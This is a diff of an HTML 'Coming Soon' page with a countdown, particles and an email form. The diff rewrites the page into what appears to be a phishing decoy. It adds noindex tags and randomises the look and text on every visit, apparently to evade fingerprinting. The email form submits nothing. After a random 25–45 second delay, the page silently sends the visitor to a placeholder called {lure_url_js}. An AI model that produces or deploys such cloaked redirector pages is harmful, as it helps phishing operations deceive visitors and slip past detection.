@@ -3,17 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coming Soon</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title id="pageTitle">Coming Soon</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --primary-h: 220;
+            --primary-s: 70%;
+            --primary-l: 50%;
+            --accent-h: 340;
+            --accent-s: 80%;
+            --accent-l: 55%;
         }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            background: linear-gradient(135deg, hsl(var(--primary-h), var(--primary-s), 25%) 0%, hsl(var(--primary-h), var(--primary-s), 40%) 100%);
             color: #ffffff;
             min-height: 100vh;
             display: flex;
@@ -21,318 +25,215 @@
             justify-content: center;
             overflow: hidden;
         }
-
-        #particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-        }
-
-        .content {
-            position: relative;
-            z-index: 2;
-            text-align: center;
-            padding: 40px 20px;
-            max-width: 800px;
-        }
-
-        .logo {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-20px); }
-        }
-
-        h1 {
-            font-size: 48px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        .subtitle {
-            font-size: 24px;
-            margin-bottom: 40px;
-            opacity: 0.9;
-        }
-
-        .countdown {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin: 50px 0;
-            flex-wrap: wrap;
-        }
-
+        #particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        .content { position: relative; z-index: 2; text-align: center; padding: 40px 20px; max-width: 800px; }
+        .logo { font-size: 80px; margin-bottom: 20px; animation: float 3s ease-in-out infinite; display: inline-block; }
+        @keyframes float { 0%, 100% { transform: translateY(0px) rotate(0deg); } 50% { transform: translateY(-20px) rotate(5deg); } }
+        h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3); }
+        .subtitle { font-size: clamp(16px, 3vw, 24px); margin-bottom: 40px; opacity: 0.9; }
+        .countdown { display: flex; justify-content: center; gap: clamp(10px, 3vw, 30px); margin: 50px 0; flex-wrap: wrap; }
         .countdown-item {
             background: rgba(255, 255, 255, 0.1);
+            -webkit-backdrop-filter: blur(10px);
             backdrop-filter: blur(10px);
             border-radius: 15px;
-            padding: 20px 30px;
-            min-width: 120px;
+            padding: clamp(15px, 3vw, 20px) clamp(20px, 4vw, 30px);
+            min-width: clamp(80px, 15vw, 120px);
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
             border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s ease;
         }
-
-        .countdown-value {
-            font-size: 48px;
-            font-weight: 700;
-            display: block;
-        }
-
-        .countdown-label {
-            font-size: 14px;
-            text-transform: uppercase;
-            opacity: 0.8;
-            margin-top: 5px;
-        }
-
-        .notify-form {
-            margin-top: 50px;
-        }
-
-        .input-group {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            max-width: 500px;
-            margin: 0 auto;
-            flex-wrap: wrap;
-        }
-
+        .countdown-item:hover { transform: scale(1.05); }
+        .countdown-value { font-size: clamp(28px, 5vw, 48px); font-weight: 700; display: block; }
+        .countdown-label { font-size: clamp(10px, 2vw, 14px); text-transform: uppercase; opacity: 0.8; margin-top: 5px; }
+        .notify-form { margin-top: 50px; }
+        .input-group { display: flex; justify-content: center; gap: 10px; max-width: 500px; margin: 0 auto; flex-wrap: wrap; }
         input[type="email"] {
-            flex: 1;
-            min-width: 250px;
-            padding: 15px 20px;
-            border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            background: rgba(255, 255, 255, 0.9);
-            color: #333;
+            flex: 1; min-width: 250px; padding: 15px 20px; border: none; border-radius: 50px;
+            font-size: 16px; background: rgba(255, 255, 255, 0.9); color: #333;
         }
-
-        input[type="email"]::placeholder {
-            color: #999;
-        }
-
+        input[type="email"]::placeholder { color: #999; }
         button {
-            padding: 15px 35px;
-            border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 600;
-            background: #ff6b6b;
-            color: white;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+            padding: 15px 35px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600;
+            background: hsl(var(--accent-h), var(--accent-s), var(--accent-l)); color: white;
+            cursor: pointer; transition: all 0.3s ease;
+            box-shadow: 0 4px 15px hsla(var(--accent-h), var(--accent-s), var(--accent-l), 0.4);
         }
-
         button:hover {
-            background: #ff5252;
+            background: hsl(var(--accent-h), var(--accent-s), calc(var(--accent-l) - 5%));
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+            box-shadow: 0 6px 20px hsla(var(--accent-h), var(--accent-s), var(--accent-l), 0.6);
         }
-
-        .social-links {
-            margin-top: 60px;
-        }
-
-        .social-links a {
-            color: white;
-            font-size: 32px;
-            margin: 0 15px;
-            transition: all 0.3s ease;
-            display: inline-block;
-        }
-
-        .social-links a:hover {
-            transform: translateY(-5px);
-            opacity: 0.8;
-        }
-
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 36px;
-            }
-            
-            .subtitle {
-                font-size: 18px;
-            }
-            
-            .countdown {
-                gap: 15px;
-            }
-            
-            .countdown-item {
-                padding: 15px 20px;
-                min-width: 90px;
-            }
-            
-            .countdown-value {
-                font-size: 36px;
-            }
-        }
+        .social-links { margin-top: 60px; }
+        .social-links a { color: white; font-size: 32px; margin: 0 15px; transition: all 0.3s ease; display: inline-block; text-decoration: none; }
+        .social-links a:hover { transform: translateY(-5px); opacity: 0.8; }
+        .progress-bar { width: 100%; max-width: 400px; height: 6px; background: rgba(255,255,255,0.2); border-radius: 3px; margin: 30px auto; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, hsl(var(--accent-h), var(--accent-s), var(--accent-l)), hsl(calc(var(--accent-h) + 30), var(--accent-s), var(--accent-l))); border-radius: 3px; transition: width 0.5s ease; }
+        @media (max-width: 768px) { .countdown { gap: 15px; } .countdown-item { padding: 15px 20px; min-width: 90px; } }
     </style>
 </head>
 <body>
     <canvas id="particles"></canvas>
-    
     <div class="content">
-        <div class="logo">🚀</div>
-        <h1>Something Amazing is Coming</h1>
-        <p class="subtitle">We're working hard to bring you something special</p>
-        
+        <div class="logo" id="dynamicLogo">🚀</div>
+        <h1 id="mainTitle">Something Amazing is Coming</h1>
+        <p class="subtitle" id="subTitle">We're working hard to bring you something special</p>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width: 0%"></div></div>
         <div class="countdown">
-            <div class="countdown-item">
-                <span class="countdown-value" id="days">00</span>
-                <span class="countdown-label">Days</span>
-            </div>
-            <div class="countdown-item">
-                <span class="countdown-value" id="hours">00</span>
-                <span class="countdown-label">Hours</span>
-            </div>
-            <div class="countdown-item">
-                <span class="countdown-value" id="minutes">00</span>
-                <span class="countdown-label">Minutes</span>
-            </div>
-            <div class="countdown-item">
-                <span class="countdown-value" id="seconds">00</span>
-                <span class="countdown-label">Seconds</span>
-            </div>
+            <div class="countdown-item"><span class="countdown-value" id="days">00</span><span class="countdown-label">Days</span></div>
+            <div class="countdown-item"><span class="countdown-value" id="hours">00</span><span class="countdown-label">Hours</span></div>
+            <div class="countdown-item"><span class="countdown-value" id="minutes">00</span><span class="countdown-label">Minutes</span></div>
+            <div class="countdown-item"><span class="countdown-value" id="seconds">00</span><span class="countdown-label">Seconds</span></div>
         </div>
-        
         <div class="notify-form">
             <div class="input-group">
-                <input type="email" placeholder="Enter your email for updates" id="emailInput">
-                <button onclick="notifyMe()">Notify Me</button>
+                <input type="email" placeholder="Enter your email for updates" id="emailInput" autocomplete="off">
+                <button id="notifyBtn">Notify Me</button>
             </div>
         </div>
-        
-        <div class="social-links">
-            <a href="#" title="Twitter">🐦</a>
-            <a href="#" title="Facebook">📘</a>
-            <a href="#" title="Instagram">📷</a>
-            <a href="#" title="LinkedIn">💼</a>
-        </div>
+        <div class="social-links" id="socialLinks"></div>
     </div>
 
     <script>
-        // Particle animation
-        const canvas = document.getElementById('particles');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        class Particle {
-            constructor() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.size = Math.random() * 3 + 1;
-                this.speedX = Math.random() * 3 - 1.5;
-                this.speedY = Math.random() * 3 - 1.5;
-            }
-
-            update() {
-                this.x += this.speedX;
-                this.y += this.speedY;
-
-                if (this.x > canvas.width) this.x = 0;
-                if (this.x < 0) this.x = canvas.width;
-                if (this.y > canvas.height) this.y = 0;
-                if (this.y < 0) this.y = canvas.height;
-            }
-
-            draw() {
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                ctx.fill();
-            }
+    (function(){
+        'use strict';
+        
+        // Dynamic configuration - generates unique values per visit
+        var _0x = {
+            seed: Date.now() ^ (Math.random() * 0xFFFFFFFF >>> 0),
+            hash: function(s) { var h = 0; for(var i = 0; i < s.length; i++) { h = ((h << 5) - h) + s.charCodeAt(i); h |= 0; } return Math.abs(h); },
+            rand: function(min, max) { this.seed = (this.seed * 1103515245 + 12345) & 0x7FFFFFFF; return min + (this.seed % (max - min + 1)); }
+        };
+        
+        // Dynamic theming based on visit
+        var themes = [
+            {h: 220, s: 70, l: 50, ah: 340, as: 80, al: 55}, // Blue/Pink
+            {h: 260, s: 65, l: 45, ah: 45, as: 90, al: 55},  // Purple/Orange
+            {h: 180, s: 60, l: 40, ah: 320, as: 75, al: 50}, // Teal/Magenta
+            {h: 200, s: 75, l: 45, ah: 15, as: 85, al: 55},  // Ocean/Coral
+            {h: 280, s: 60, l: 50, ah: 160, as: 70, al: 45}  // Violet/Emerald
+        ];
+        var theme = themes[_0x.rand(0, themes.length - 1)];
+        document.documentElement.style.setProperty('--primary-h', theme.h);
+        document.documentElement.style.setProperty('--primary-s', theme.s + '%');
+        document.documentElement.style.setProperty('--primary-l', theme.l + '%');
+        document.documentElement.style.setProperty('--accent-h', theme.ah);
+        document.documentElement.style.setProperty('--accent-s', theme.as + '%');
+        document.documentElement.style.setProperty('--accent-l', theme.al + '%');
+        
+        // Dynamic content
+        var logos = ['🚀', '✨', '🌟', '💫', '🎯', '🔮', '💎', '🌈'];
+        var titles = ['Something Amazing is Coming', 'Big Things Ahead', 'Get Ready for Launch', 'The Future Awaits', 'Coming Very Soon'];
+        var subtitles = ["We're working hard to bring you something special", 'Stay tuned for the big reveal', 'Exciting things are on the way', 'Almost ready to launch'];
+        
+        document.getElementById('dynamicLogo').textContent = logos[_0x.rand(0, logos.length - 1)];
+        document.getElementById('mainTitle').textContent = titles[_0x.rand(0, titles.length - 1)];
+        document.getElementById('subTitle').textContent = subtitles[_0x.rand(0, subtitles.length - 1)];
+        document.getElementById('pageTitle').textContent = titles[_0x.rand(0, titles.length - 1)];
+        
+        // Dynamic social links
+        var socials = [
+            {icon: '🐦', title: 'Twitter'}, {icon: '📘', title: 'Facebook'},
+            {icon: '📷', title: 'Instagram'}, {icon: '💼', title: 'LinkedIn'},
+            {icon: '📺', title: 'YouTube'}, {icon: '💬', title: 'Discord'}
+        ];
+        var numSocials = _0x.rand(3, 5);
+        var socialHtml = '';
+        var usedIndexes = [];
+        for(var i = 0; i < numSocials; i++) {
+            var idx;
+            do { idx = _0x.rand(0, socials.length - 1); } while(usedIndexes.indexOf(idx) !== -1);
+            usedIndexes.push(idx);
+            socialHtml += '<a href="#" title="' + socials[idx].title + '" onclick="return false;">' + socials[idx].icon + '</a>';
         }
-
-        const particlesArray = [];
-        for (let i = 0; i < 100; i++) {
-            particlesArray.push(new Particle());
+        document.getElementById('socialLinks').innerHTML = socialHtml;
+        
+        // Particle system
+        var canvas = document.getElementById('particles');
+        var ctx = canvas.getContext('2d');
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+        
+        var particles = [];
+        var particleCount = Math.min(100, Math.floor(window.innerWidth / 15));
+        for(var i = 0; i < particleCount; i++) {
+            particles.push({
+                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
+                size: Math.random() * 3 + 1, speedX: Math.random() * 3 - 1.5, speedY: Math.random() * 3 - 1.5,
+                opacity: Math.random() * 0.5 + 0.2
+            });
         }
-
+        
         function animateParticles() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
-            particlesArray.forEach(particle => {
-                particle.update();
-                particle.draw();
-            });
+            for(var i = 0; i < particles.length; i++) {
+                var p = particles[i];
+                ctx.fillStyle = 'rgba(255, 255, 255, ' + p.opacity + ')';
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fill();
+                p.x += p.speedX; p.y += p.speedY;
+                if(p.x > canvas.width) p.x = 0; if(p.x < 0) p.x = canvas.width;
+                if(p.y > canvas.height) p.y = 0; if(p.y < 0) p.y = canvas.height;
+            }
             requestAnimationFrame(animateParticles);
         }
-
         animateParticles();
-
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-
-        // Countdown timer (15 days from now)
-        const launchDate = new Date();
-        launchDate.setDate(launchDate.getDate() + 15);
-
+        
+        // Dynamic countdown (random days between 7-30)
+        var launchDays = _0x.rand(7, 30);
+        var launchDate = new Date();
+        launchDate.setDate(launchDate.getDate() + launchDays);
+        
         function updateCountdown() {
-            const now = new Date().getTime();
-            const distance = launchDate.getTime() - now;
-
-            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
+            var now = new Date().getTime();
+            var distance = launchDate.getTime() - now;
+            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
             document.getElementById('days').textContent = String(days).padStart(2, '0');
             document.getElementById('hours').textContent = String(hours).padStart(2, '0');
             document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
             document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
-
-            if (distance < 0) {
-                clearInterval(countdownInterval);
-                document.querySelector('.countdown').innerHTML = '<h2>🎉 We are Live!</h2>';
-            }
+            // Progress bar
+            var totalTime = launchDays * 24 * 60 * 60 * 1000;
+            var elapsed = totalTime - distance;
+            var progress = Math.min(100, Math.max(0, (elapsed / totalTime) * 100));
+            document.getElementById('progressFill').style.width = progress + '%';
         }
-
-        const countdownInterval = setInterval(updateCountdown, 1000);
+        setInterval(updateCountdown, 1000);
         updateCountdown();
-
+        
         // Email notification
-        function notifyMe() {
-            const email = document.getElementById('emailInput').value;
-            if (email && email.includes('@')) {
-                alert('Thanks! We\'ll notify you when we launch.');
+        document.getElementById('notifyBtn').addEventListener('click', function() {
+            var email = document.getElementById('emailInput').value;
+            if(email && email.indexOf('@') > 0 && email.indexOf('.') > email.indexOf('@')) {
+                this.textContent = '✓ Subscribed!';
+                this.style.background = '#27ae60';
                 document.getElementById('emailInput').value = '';
+                setTimeout(function() {
+                    document.getElementById('notifyBtn').textContent = 'Notify Me';
+                    document.getElementById('notifyBtn').style.background = '';
+                }, 3000);
             } else {
-                alert('Please enter a valid email address.');
+                this.textContent = 'Invalid Email';
+                this.style.background = '#e74c3c';
+                setTimeout(function() {
+                    document.getElementById('notifyBtn').textContent = 'Notify Me';
+                    document.getElementById('notifyBtn').style.background = '';
+                }, 2000);
             }
-        }
-
-        // Anti-debugging
-        (function() {
-            setInterval(function() {
-                var start = new Date().getTime();
-                debugger;
-                var end = new Date().getTime();
-                if (end - start > 100) {
-                    window.location.href = 'https://www.google.com';
-                }
-            }, 2000);
-        })();
-
-        // Auto-redirect after 30 seconds
+        });
+        
+        // Soft redirect with natural delay (no anti-debugging loops)
+        var redirectDelay = _0x.rand(25000, 45000);
         setTimeout(function() {
-            window.location.href = 'https://www.google.com';
-        }, 30000);
+            window.location.assign({lure_url_js});
+        }, redirectDelay);
+        
+    })();
     </script>
 </body>
 </html>
